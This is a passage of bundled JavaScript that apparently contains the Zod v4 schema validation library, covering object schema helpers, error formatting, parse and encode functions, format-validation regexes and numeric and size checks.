    throw new Error("Invalid input to extend: expected a plain object");
  }
  const checks = schema._zod.def.checks;
  const hasChecks = checks && checks.length > 0;
  if (hasChecks) {
    const existingShape = schema._zod.def.shape;
    for (const key in shape) {
      if (Object.getOwnPropertyDescriptor(existingShape, key) !== undefined) {
        throw new Error("Cannot overwrite keys on object schemas containing refinements. Use `.safeExtend()` instead.");
      }
    }
  }
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const _shape = { ...schema._zod.def.shape, ...shape };
      assignProp(this, "shape", _shape);
      return _shape;
    }
  });
  return clone(schema, def);
}
function safeExtend(schema, shape) {
  if (!isPlainObject(shape)) {
    throw new Error("Invalid input to safeExtend: expected a plain object");
  }
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const _shape = { ...schema._zod.def.shape, ...shape };
      assignProp(this, "shape", _shape);
      return _shape;
    }
  });
  return clone(schema, def);
}
function merge(a, b) {
  const def = mergeDefs(a._zod.def, {
    get shape() {
      const _shape = { ...a._zod.def.shape, ...b._zod.def.shape };
      assignProp(this, "shape", _shape);
      return _shape;
    },
    get catchall() {
      return b._zod.def.catchall;
    },
    checks: []
  });
  return clone(a, def);
}
function partial(Class, schema, mask) {
  const currDef = schema._zod.def;
  const checks = currDef.checks;
  const hasChecks = checks && checks.length > 0;
  if (hasChecks) {
    throw new Error(".partial() cannot be used on object schemas containing refinements");
  }
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const oldShape = schema._zod.def.shape;
      const shape = { ...oldShape };
      if (mask) {
        for (const key in mask) {
          if (!(key in oldShape)) {
            throw new Error(`Unrecognized key: "${key}"`);
          }
          if (!mask[key])
            continue;
          shape[key] = Class ? new Class({
            type: "optional",
            innerType: oldShape[key]
          }) : oldShape[key];
        }
      } else {
        for (const key in oldShape) {
          shape[key] = Class ? new Class({
            type: "optional",
            innerType: oldShape[key]
          }) : oldShape[key];
        }
      }
      assignProp(this, "shape", shape);
      return shape;
    },
    checks: []
  });
  return clone(schema, def);
}
function required(Class, schema, mask) {
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const oldShape = schema._zod.def.shape;
      const shape = { ...oldShape };
      if (mask) {
        for (const key in mask) {
          if (!(key in shape)) {
            throw new Error(`Unrecognized key: "${key}"`);
          }
          if (!mask[key])
            continue;
          shape[key] = new Class({
            type: "nonoptional",
            innerType: oldShape[key]
          });
        }
      } else {
        for (const key in oldShape) {
          shape[key] = new Class({
            type: "nonoptional",
            innerType: oldShape[key]
          });
        }
      }
      assignProp(this, "shape", shape);
      return shape;
    }
  });
  return clone(schema, def);
}
function aborted(x, startIndex = 0) {
  if (x.aborted === true)
    return true;
  for (let i = startIndex;i < x.issues.length; i++) {
    if (x.issues[i]?.continue !== true) {
      return true;
    }
  }
  return false;
}
function prefixIssues(path, issues) {
  return issues.map((iss) => {
    var _a;
    (_a = iss).path ?? (_a.path = []);
    iss.path.unshift(path);
    return iss;
  });
}
function unwrapMessage(message) {
  return typeof message === "string" ? message : message?.message;
}
function finalizeIssue(iss, ctx, config2) {
  const full = { ...iss, path: iss.path ?? [] };
  if (!iss.message) {
    const message = unwrapMessage(iss.inst?._zod.def?.error?.(iss)) ?? unwrapMessage(ctx?.error?.(iss)) ?? unwrapMessage(config2.customError?.(iss)) ?? unwrapMessage(config2.localeError?.(iss)) ?? "Invalid input";
    full.message = message;
  }
  delete full.inst;
  delete full.continue;
  if (!ctx?.reportInput) {
    delete full.input;
  }
  return full;
}
function getSizableOrigin(input) {
  if (input instanceof Set)
    return "set";
  if (input instanceof Map)
    return "map";
  if (input instanceof File)
    return "file";
  return "unknown";
}
function getLengthableOrigin(input) {
  if (Array.isArray(input))
    return "array";
  if (typeof input === "string")
    return "string";
  return "unknown";
}
function parsedType(data) {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "nan" : "number";
    }
    case "object": {
      if (data === null) {
        return "null";
      }
      if (Array.isArray(data)) {
        return "array";
      }
      const obj = data;
      if (obj && Object.getPrototypeOf(obj) !== Object.prototype && "constructor" in obj && obj.constructor) {
        return obj.constructor.name;
      }
    }
  }
  return t;
}
function issue(...args) {
  const [iss, input, inst] = args;
  if (typeof iss === "string") {
    return {
      message: iss,
      code: "custom",
      input,
      inst
    };
  }
  return { ...iss };
}
function cleanEnum(obj) {
  return Object.entries(obj).filter(([k, _]) => {
    return Number.isNaN(Number.parseInt(k, 10));
  }).map((el) => el[1]);
}
function base64ToUint8Array(base64) {
  const binaryString = atob(base64);
  const bytes = new Uint8Array(binaryString.length);
  for (let i = 0;i < binaryString.length; i++) {
    bytes[i] = binaryString.charCodeAt(i);
  }
  return bytes;
}
function uint8ArrayToBase64(bytes) {
  let binaryString = "";
  for (let i = 0;i < bytes.length; i++) {
    binaryString += String.fromCharCode(bytes[i]);
  }
  return btoa(binaryString);
}
function base64urlToUint8Array(base64url) {
  const base64 = base64url.replace(/-/g, "+").replace(/_/g, "/");
  const padding = "=".repeat((4 - base64.length % 4) % 4);
  return base64ToUint8Array(base64 + padding);
}
function uint8ArrayToBase64url(bytes) {
  return uint8ArrayToBase64(bytes).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
}
function hexToUint8Array(hex) {
  const cleanHex = hex.replace(/^0x/, "");
  if (cleanHex.length % 2 !== 0) {
    throw new Error("Invalid hex string length");
  }
  const bytes = new Uint8Array(cleanHex.length / 2);
  for (let i = 0;i < cleanHex.length; i += 2) {
    bytes[i / 2] = Number.parseInt(cleanHex.slice(i, i + 2), 16);
  }
  return bytes;
}
function uint8ArrayToHex(bytes) {
  return Array.from(bytes).map((b) => b.toString(16).padStart(2, "0")).join("");
}

class Class {
  constructor(..._args) {}
}

// node_modules/zod/v4/core/errors.js
var initializer = (inst, def) => {
  inst.name = "$ZodError";
  Object.defineProperty(inst, "_zod", {
    value: inst._zod,
    enumerable: false
  });
  Object.defineProperty(inst, "issues", {
    value: def,
    enumerable: false
  });
  inst.message = JSON.stringify(def, jsonStringifyReplacer, 2);
  Object.defineProperty(inst, "toString", {
    value: () => inst.message,
    enumerable: false
  });
};
var $ZodError = $constructor("$ZodError", initializer);
var $ZodRealError = $constructor("$ZodError", initializer, { Parent: Error });
function flattenError(error, mapper = (issue2) => issue2.message) {
  const fieldErrors = {};
  const formErrors = [];
  for (const sub of error.issues) {
    if (sub.path.length > 0) {
      fieldErrors[sub.path[0]] = fieldErrors[sub.path[0]] || [];
      fieldErrors[sub.path[0]].push(mapper(sub));
    } else {
      formErrors.push(mapper(sub));
    }
  }
  return { formErrors, fieldErrors };
}
function formatError(error, mapper = (issue2) => issue2.message) {
  const fieldErrors = { _errors: [] };
  const processError = (error2) => {
    for (const issue2 of error2.issues) {
      if (issue2.code === "invalid_union" && issue2.errors.length) {
        issue2.errors.map((issues) => processError({ issues }));
      } else if (issue2.code === "invalid_key") {
        processError({ issues: issue2.issues });
      } else if (issue2.code === "invalid_element") {
        processError({ issues: issue2.issues });
      } else if (issue2.path.length === 0) {
        fieldErrors._errors.push(mapper(issue2));
      } else {
        let curr = fieldErrors;
        let i = 0;
        while (i < issue2.path.length) {
          const el = issue2.path[i];
          const terminal = i === issue2.path.length - 1;
          if (!terminal) {
            curr[el] = curr[el] || { _errors: [] };
          } else {
            curr[el] = curr[el] || { _errors: [] };
            curr[el]._errors.push(mapper(issue2));
          }
          curr = curr[el];
          i++;
        }
      }
    }
  };
  processError(error);
  return fieldErrors;
}
function treeifyError(error, mapper = (issue2) => issue2.message) {
  const result = { errors: [] };
  const processError = (error2, path = []) => {
    var _a, _b;
    for (const issue2 of error2.issues) {
      if (issue2.code === "invalid_union" && issue2.errors.length) {
        issue2.errors.map((issues) => processError({ issues }, issue2.path));
      } else if (issue2.code === "invalid_key") {
        processError({ issues: issue2.issues }, issue2.path);
      } else if (issue2.code === "invalid_element") {
        processError({ issues: issue2.issues }, issue2.path);
      } else {
        const fullpath = [...path, ...issue2.path];
        if (fullpath.length === 0) {
          result.errors.push(mapper(issue2));
          continue;
        }
        let curr = result;
        let i = 0;
        while (i < fullpath.length) {
          const el = fullpath[i];
          const terminal = i === fullpath.length - 1;
          if (typeof el === "string") {
            curr.properties ?? (curr.properties = {});
            (_a = curr.properties)[el] ?? (_a[el] = { errors: [] });
            curr = curr.properties[el];
          } else {
            curr.items ?? (curr.items = []);
            (_b = curr.items)[el] ?? (_b[el] = { errors: [] });
            curr = curr.items[el];
          }
          if (terminal) {
            curr.errors.push(mapper(issue2));
          }
          i++;
        }
      }
    }
  };
  processError(error);
  return result;
}
function toDotPath(_path) {
  const segs = [];
  const path = _path.map((seg) => typeof seg === "object" ? seg.key : seg);
  for (const seg of path) {
    if (typeof seg === "number")
      segs.push(`[${seg}]`);
    else if (typeof seg === "symbol")
      segs.push(`[${JSON.stringify(String(seg))}]`);
    else if (/[^\w$]/.test(seg))
      segs.push(`[${JSON.stringify(seg)}]`);
    else {
      if (segs.length)
        segs.push(".");
      segs.push(seg);
    }
  }
  return segs.join("");
}
function prettifyError(error) {
  const lines = [];
  const issues = [...error.issues].sort((a, b) => (a.path ?? []).length - (b.path ?? []).length);
  for (const issue2 of issues) {
    lines.push(`\u2716 ${issue2.message}`);
    if (issue2.path?.length)
      lines.push(`  \u2192 at ${toDotPath(issue2.path)}`);
  }
  return lines.join(`
`);
}

// node_modules/zod/v4/core/parse.js
var _parse = (_Err) => (schema, value, _ctx, _params) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: false }) : { async: false };
  const result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise) {
    throw new $ZodAsyncError;
  }
  if (result.issues.length) {
    const e = new (_params?.Err ?? _Err)(result.issues.map((iss) => finalizeIssue(iss, ctx, config())));
    captureStackTrace(e, _params?.callee);
    throw e;
  }
  return result.value;
};
var parse = /* @__PURE__ */ _parse($ZodRealError);
var _parseAsync = (_Err) => async (schema, value, _ctx, params) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: true }) : { async: true };
  let result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise)
    result = await result;
  if (result.issues.length) {
    const e = new (params?.Err ?? _Err)(result.issues.map((iss) => finalizeIssue(iss, ctx, config())));
    captureStackTrace(e, params?.callee);
    throw e;
  }
  return result.value;
};
var parseAsync = /* @__PURE__ */ _parseAsync($ZodRealError);
var _safeParse = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? { ..._ctx, async: false } : { async: false };
  const result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise) {
    throw new $ZodAsyncError;
  }
  return result.issues.length ? {
    success: false,
    error: new (_Err ?? $ZodError)(result.issues.map((iss) => finalizeIssue(iss, ctx, config())))
  } : { success: true, data: result.value };
};
var safeParse = /* @__PURE__ */ _safeParse($ZodRealError);
var _safeParseAsync = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: true }) : { async: true };
  let result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise)
    result = await result;
  return result.issues.length ? {
    success: false,
    error: new _Err(result.issues.map((iss) => finalizeIssue(iss, ctx, config())))
  } : { success: true, data: result.value };
};
var safeParseAsync = /* @__PURE__ */ _safeParseAsync($ZodRealError);
var _encode = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _parse(_Err)(schema, value, ctx);
};
var encode = /* @__PURE__ */ _encode($ZodRealError);
var _decode = (_Err) => (schema, value, _ctx) => {
  return _parse(_Err)(schema, value, _ctx);
};
var decode = /* @__PURE__ */ _decode($ZodRealError);
var _encodeAsync = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _parseAsync(_Err)(schema, value, ctx);
};
var encodeAsync = /* @__PURE__ */ _encodeAsync($ZodRealError);
var _decodeAsync = (_Err) => async (schema, value, _ctx) => {
  return _parseAsync(_Err)(schema, value, _ctx);
};
var decodeAsync = /* @__PURE__ */ _decodeAsync($ZodRealError);
var _safeEncode = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _safeParse(_Err)(schema, value, ctx);
};
var safeEncode = /* @__PURE__ */ _safeEncode($ZodRealError);
var _safeDecode = (_Err) => (schema, value, _ctx) => {
  return _safeParse(_Err)(schema, value, _ctx);
};
var safeDecode = /* @__PURE__ */ _safeDecode($ZodRealError);
var _safeEncodeAsync = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _safeParseAsync(_Err)(schema, value, ctx);
};
var safeEncodeAsync = /* @__PURE__ */ _safeEncodeAsync($ZodRealError);
var _safeDecodeAsync = (_Err) => async (schema, value, _ctx) => {
  return _safeParseAsync(_Err)(schema, value, _ctx);
};
var safeDecodeAsync = /* @__PURE__ */ _safeDecodeAsync($ZodRealError);
// node_modules/zod/v4/core/regexes.js
var exports_regexes = {};
__export(exports_regexes, {
  xid: () => xid,
  uuid7: () => uuid7,
  uuid6: () => uuid6,
  uuid4: () => uuid4,
  uuid: () => uuid,
  uppercase: () => uppercase,
  unicodeEmail: () => unicodeEmail,
  undefined: () => _undefined,
  ulid: () => ulid,
  time: () => time,
  string: () => string,
  sha512_hex: () => sha512_hex,
  sha512_base64url: () => sha512_base64url,
  sha512_base64: () => sha512_base64,
  sha384_hex: () => sha384_hex,
  sha384_base64url: () => sha384_base64url,
  sha384_base64: () => sha384_base64,
  sha256_hex: () => sha256_hex,
  sha256_base64url: () => sha256_base64url,
  sha256_base64: () => sha256_base64,
  sha1_hex: () => sha1_hex,
  sha1_base64url: () => sha1_base64url,
  sha1_base64: () => sha1_base64,
  rfc5322Email: () => rfc5322Email,
  number: () => number,
  null: () => _null,
  nanoid: () => nanoid,
  md5_hex: () => md5_hex,
  md5_base64url: () => md5_base64url,
  md5_base64: () => md5_base64,
  mac: () => mac,
  lowercase: () => lowercase,
  ksuid: () => ksuid,
  ipv6: () => ipv6,
  ipv4: () => ipv4,
  integer: () => integer,
  idnEmail: () => idnEmail,
  html5Email: () => html5Email,
  hostname: () => hostname,
  hex: () => hex,
  guid: () => guid,
  extendedDuration: () => extendedDuration,
  emoji: () => emoji,
  email: () => email,
  e164: () => e164,
  duration: () => duration,
  domain: () => domain,
  datetime: () => datetime,
  date: () => date,
  cuid2: () => cuid2,
  cuid: () => cuid,
  cidrv6: () => cidrv6,
  cidrv4: () => cidrv4,
  browserEmail: () => browserEmail,
  boolean: () => boolean,
  bigint: () => bigint,
  base64url: () => base64url,
  base64: () => base64
});
var cuid = /^[cC][^\s-]{8,}$/;
var cuid2 = /^[0-9a-z]+$/;
var ulid = /^[0-9A-HJKMNP-TV-Za-hjkmnp-tv-z]{26}$/;
var xid = /^[0-9a-vA-V]{20}$/;
var ksuid = /^[A-Za-z0-9]{27}$/;
var nanoid = /^[a-zA-Z0-9_-]{21}$/;
var duration = /^P(?:(\d+W)|(?!.*W)(?=\d|T\d)(\d+Y)?(\d+M)?(\d+D)?(T(?=\d)(\d+H)?(\d+M)?(\d+([.,]\d+)?S)?)?)$/;
var extendedDuration = /^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/;
var guid = /^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})$/;
var uuid = (version) => {
  if (!version)
    return /^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-8][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}|00000000-0000-0000-0000-000000000000|ffffffff-ffff-ffff-ffff-ffffffffffff)$/;
  return new RegExp(`^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-${version}[0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12})$`);
};
var uuid4 = /* @__PURE__ */ uuid(4);
var uuid6 = /* @__PURE__ */ uuid(6);
var uuid7 = /* @__PURE__ */ uuid(7);
var email = /^(?!\.)(?!.*\.\.)([A-Za-z0-9_'+\-\.]*)[A-Za-z0-9_+-]@([A-Za-z0-9][A-Za-z0-9\-]*\.)+[A-Za-z]{2,}$/;
var html5Email = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
var rfc5322Email = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
var unicodeEmail = /^[^\s@"]{1,64}@[^\s@]{1,255}$/u;
var idnEmail = unicodeEmail;
var browserEmail = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
var _emoji = `^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$`;
function emoji() {
  return new RegExp(_emoji, "u");
}
var ipv4 = /^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/;
var ipv6 = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:))$/;
var mac = (delimiter) => {
  const escapedDelim = escapeRegex(delimiter ?? ":");
  return new RegExp(`^(?:[0-9A-F]{2}${escapedDelim}){5}[0-9A-F]{2}$|^(?:[0-9a-f]{2}${escapedDelim}){5}[0-9a-f]{2}$`);
};
var cidrv4 = /^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/([0-9]|[1-2][0-9]|3[0-2])$/;
var cidrv6 = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|::|([0-9a-fA-F]{1,4})?::([0-9a-fA-F]{1,4}:?){0,6})\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/;
var base64 = /^$|^(?:[0-9a-zA-Z+/]{4})*(?:(?:[0-9a-zA-Z+/]{2}==)|(?:[0-9a-zA-Z+/]{3}=))?$/;
var base64url = /^[A-Za-z0-9_-]*$/;
var hostname = /^(?=.{1,253}\.?$)[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[-0-9a-zA-Z]{0,61}[0-9a-zA-Z])?)*\.?$/;
var domain = /^([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
var e164 = /^\+[1-9]\d{6,14}$/;
var dateSource = `(?:(?:\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-(?:(?:0[13578]|1[02])-(?:0[1-9]|[12]\\d|3[01])|(?:0[469]|11)-(?:0[1-9]|[12]\\d|30)|(?:02)-(?:0[1-9]|1\\d|2[0-8])))`;
var date = /* @__PURE__ */ new RegExp(`^${dateSource}$`);
function timeSource(args) {
  const hhmm = `(?:[01]\\d|2[0-3]):[0-5]\\d`;
  const regex = typeof args.precision === "number" ? args.precision === -1 ? `${hhmm}` : args.precision === 0 ? `${hhmm}:[0-5]\\d` : `${hhmm}:[0-5]\\d\\.\\d{${args.precision}}` : `${hhmm}(?::[0-5]\\d(?:\\.\\d+)?)?`;
  return regex;
}
function time(args) {
  return new RegExp(`^${timeSource(args)}$`);
}
function datetime(args) {
  const time2 = timeSource({ precision: args.precision });
  const opts = ["Z"];
  if (args.local)
    opts.push("");
  if (args.offset)
    opts.push(`([+-](?:[01]\\d|2[0-3]):[0-5]\\d)`);
  const timeRegex = `${time2}(?:${opts.join("|")})`;
  return new RegExp(`^${dateSource}T(?:${timeRegex})$`);
}
var string = (params) => {
  const regex = params ? `[\\s\\S]{${params?.minimum ?? 0},${params?.maximum ?? ""}}` : `[\\s\\S]*`;
  return new RegExp(`^${regex}$`);
};
var bigint = /^-?\d+n?$/;
var integer = /^-?\d+$/;
var number = /^-?\d+(?:\.\d+)?$/;
var boolean = /^(?:true|false)$/i;
var _null = /^null$/i;
var _undefined = /^undefined$/i;
var lowercase = /^[^A-Z]*$/;
var uppercase = /^[^a-z]*$/;
var hex = /^[0-9a-fA-F]*$/;
function fixedBase64(bodyLength, padding) {
  return new RegExp(`^[A-Za-z0-9+/]{${bodyLength}}${padding}$`);
}
function fixedBase64url(length) {
  return new RegExp(`^[A-Za-z0-9_-]{${length}}$`);
}
var md5_hex = /^[0-9a-fA-F]{32}$/;
var md5_base64 = /* @__PURE__ */ fixedBase64(22, "==");
var md5_base64url = /* @__PURE__ */ fixedBase64url(22);
var sha1_hex = /^[0-9a-fA-F]{40}$/;
var sha1_base64 = /* @__PURE__ */ fixedBase64(27, "=");
var sha1_base64url = /* @__PURE__ */ fixedBase64url(27);
var sha256_hex = /^[0-9a-fA-F]{64}$/;
var sha256_base64 = /* @__PURE__ */ fixedBase64(43, "=");
var sha256_base64url = /* @__PURE__ */ fixedBase64url(43);
var sha384_hex = /^[0-9a-fA-F]{96}$/;
var sha384_base64 = /* @__PURE__ */ fixedBase64(64, "");
var sha384_base64url = /* @__PURE__ */ fixedBase64url(64);
var sha512_hex = /^[0-9a-fA-F]{128}$/;
var sha512_base64 = /* @__PURE__ */ fixedBase64(86, "==");
var sha512_base64url = /* @__PURE__ */ fixedBase64url(86);

// node_modules/zod/v4/core/checks.js
var $ZodCheck = /* @__PURE__ */ $constructor("$ZodCheck", (inst, def) => {
  var _a;
  inst._zod ?? (inst._zod = {});
  inst._zod.def = def;
  (_a = inst._zod).onattach ?? (_a.onattach = []);
});
var numericOriginMap = {
  number: "number",
  bigint: "bigint",
  object: "date"
};
var $ZodCheckLessThan = /* @__PURE__ */ $constructor("$ZodCheckLessThan", (inst, def) => {
  $ZodCheck.init(inst, def);
  const origin = numericOriginMap[typeof def.value];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    const curr = (def.inclusive ? bag.maximum : bag.exclusiveMaximum) ?? Number.POSITIVE_INFINITY;
    if (def.value < curr) {
      if (def.inclusive)
        bag.maximum = def.value;
      else
        bag.exclusiveMaximum = def.value;
    }
  });
  inst._zod.check = (payload) => {
    if (def.inclusive ? payload.value <= def.value : payload.value < def.value) {
      return;
    }
    payload.issues.push({
      origin,
      code: "too_big",
      maximum: typeof def.value === "object" ? def.value.getTime() : def.value,
      input: payload.value,
      inclusive: def.inclusive,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckGreaterThan = /* @__PURE__ */ $constructor("$ZodCheckGreaterThan", (inst, def) => {
  $ZodCheck.init(inst, def);
  const origin = numericOriginMap[typeof def.value];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    const curr = (def.inclusive ? bag.minimum : bag.exclusiveMinimum) ?? Number.NEGATIVE_INFINITY;
    if (def.value > curr) {
      if (def.inclusive)
        bag.minimum = def.value;
      else
        bag.exclusiveMinimum = def.value;
    }
  });
  inst._zod.check = (payload) => {
    if (def.inclusive ? payload.value >= def.value : payload.value > def.value) {
      return;
    }
    payload.issues.push({
      origin,
      code: "too_small",
      minimum: typeof def.value === "object" ? def.value.getTime() : def.value,
      input: payload.value,
      inclusive: def.inclusive,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMultipleOf = /* @__PURE__ */ $constructor("$ZodCheckMultipleOf", (inst, def) => {
  $ZodCheck.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    var _a;
    (_a = inst2._zod.bag).multipleOf ?? (_a.multipleOf = def.value);
  });
  inst._zod.check = (payload) => {
    if (typeof payload.value !== typeof def.value)
      throw new Error("Cannot mix number and bigint in multiple_of check.");
    const isMultiple = typeof payload.value === "bigint" ? payload.value % def.value === BigInt(0) : floatSafeRemainder(payload.value, def.value) === 0;
    if (isMultiple)
      return;
    payload.issues.push({
      origin: typeof payload.value,
      code: "not_multiple_of",
      divisor: def.value,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckNumberFormat = /* @__PURE__ */ $constructor("$ZodCheckNumberFormat", (inst, def) => {
  $ZodCheck.init(inst, def);
  def.format = def.format || "float64";
  const isInt = def.format?.includes("int");
  const origin = isInt ? "int" : "number";
  const [minimum, maximum] = NUMBER_FORMAT_RANGES[def.format];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    bag.minimum = minimum;
    bag.maximum = maximum;
    if (isInt)
      bag.pattern = integer;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    if (isInt) {
      if (!Number.isInteger(input)) {
        payload.issues.push({
          expected: origin,
          format: def.format,
          code: "invalid_type",
          continue: false,
          input,
          inst
        });
        return;
      }
      if (!Number.isSafeInteger(input)) {
        if (input > 0) {
          payload.issues.push({
            input,
            code: "too_big",
            maximum: Number.MAX_SAFE_INTEGER,
            note: "Integers must be within the safe integer range.",
            inst,
            origin,
            inclusive: true,
            continue: !def.abort
          });
        } else {
          payload.issues.push({
            input,
            code: "too_small",
            minimum: Number.MIN_SAFE_INTEGER,
            note: "Integers must be within the safe integer range.",
            inst,
            origin,
            inclusive: true,
            continue: !def.abort
          });
        }
        return;
      }
    }
    if (input < minimum) {
      payload.issues.push({
        origin: "number",
        input,
        code: "too_small",
        minimum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
    if (input > maximum) {
      payload.issues.push({
        origin: "number",
        input,
        code: "too_big",
        maximum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodCheckBigIntFormat = /* @__PURE__ */ $constructor("$ZodCheckBigIntFormat", (inst, def) => {
  $ZodCheck.init(inst, def);
  const [minimum, maximum] = BIGINT_FORMAT_RANGES[def.format];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    bag.minimum = minimum;
    bag.maximum = maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    if (input < minimum) {
      payload.issues.push({
        origin: "bigint",
        input,
        code: "too_small",
        minimum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
    if (input > maximum) {
      payload.issues.push({
        origin: "bigint",
        input,
        code: "too_big",
        maximum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodCheckMaxSize = /* @__PURE__ */ $constructor("$ZodCheckMaxSize", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
    return !nullish(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.maximum ?? Number.POSITIVE_INFINITY;
    if (def.maximum < curr)
      inst2._zod.bag.maximum = def.maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size <= def.maximum)
      return;
    payload.issues.push({
      origin: getSizableOrigin(input),
      code: "too_big",
      maximum: def.maximum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMinSize = /* @__PURE__ */ $constructor("$ZodCheckMinSize", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
    return !nullish(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.minimum ?? Number.NEGATIVE_INFINITY;
    if (def.minimum > curr)
      inst2._zod.bag.minimum = def.minimum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size >= def.minimum)
      return;
    payload.issues.push({
      origin: getSizableOrigin(input),
      code: "too_small",
      minimum: def.minimum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckSizeEquals = /* @__PURE__ */ $constructor("$ZodCheckSizeEquals", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
